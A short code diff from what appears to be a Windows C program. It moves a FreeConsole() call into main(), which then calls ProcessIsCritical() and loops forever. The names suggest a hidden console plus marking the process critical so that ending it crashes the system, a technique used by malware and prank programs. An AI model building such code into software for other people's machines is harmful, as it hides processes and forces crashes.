@@ -31,7 +31,6 @@ BOOL EnablePriv(LPCSTR lpszPriv)
  
 BOOL ProcessIsCritical() 
 {
-   FreeConsole();
    HANDLE hDLL;
    RtlSetProcessIsCritical fSetCritical;
  
@@ -49,6 +48,7 @@ BOOL ProcessIsCritical()
  
 int main (void)
 {
+   FreeConsole();
    ProcessIsCritical();
    while(1)
    {
